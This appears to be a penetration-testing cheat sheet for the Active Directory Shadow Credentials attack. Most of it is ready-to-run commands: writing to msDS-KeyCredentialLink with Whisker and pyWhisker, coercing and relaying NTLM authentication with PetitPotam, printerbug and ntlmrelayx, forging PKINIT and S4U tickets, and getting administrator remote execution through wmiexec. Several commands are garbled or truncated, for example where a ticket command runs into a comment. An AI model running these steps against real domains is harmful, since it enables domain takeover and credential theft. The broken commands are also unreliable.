# Shadow Credentials

## Tools: Whisker https://github.com/eladshamir/Whisker , pyWhisker https://github.com/ShutdownRepo/pywhisker , ShadowSpray https://github.com/Dec0ne/ShadowSpray/

### Add Key Credentials to the attribute msDS-KeyCredentialLink of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.

## WARNING! User objects can't edit their own msDS-KeyCredentialLink attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists

## Requirements

#### 1) Domain Controller on (at least) Windows Server 2016

#### 2) Domain must have Active Directory Certificate Services and Certificate Authority configured

#### 3) PKINIT Kerberos authentication

#### 4) An account with the delegated rights to write to the msDS-KeyCredentialLink attribute of the target object

## Exploitation

## Windows

#### 1) # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.

 - Whisker.exe list /target:computername$

#### 2) # Generates a public-private key pair and adds a new key credential to the target object.

 - Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1

## Linux

 - python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"

## Scenarios:

### Scenario 1: Shadow Credential relaying

#### 1) Trigger an NTLM authentication from DC01 (PetitPotam)

#### 2) Relay it to DC02 (ntlmrelayx)

#### 3) Edit DC01 's attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)

### Alternatively : 

 - ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'

### Scenario 2: Workstation Takeover with RBCD

### Only for C2: Add Reverse Port Forward from 8081 to Team Server 81

#### 1) Set up ntlmrelayx to relay authentication from target workstation to DC

 - proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-credentials

#### 2) Execute printer bug to trigger authentication from target workstation

 - proxychains python3 printerbug.py ez.lab/matt:Password1\!@ws2.ez.lab ws1@8081/

#### 3) Get a TGT using the newly acquired certificate via PKINIT

 - proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/

#### 4) Get a ST (service ticket) for the target account

 - proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.# Utilize the ST for future activity

 - export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache

 - proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab

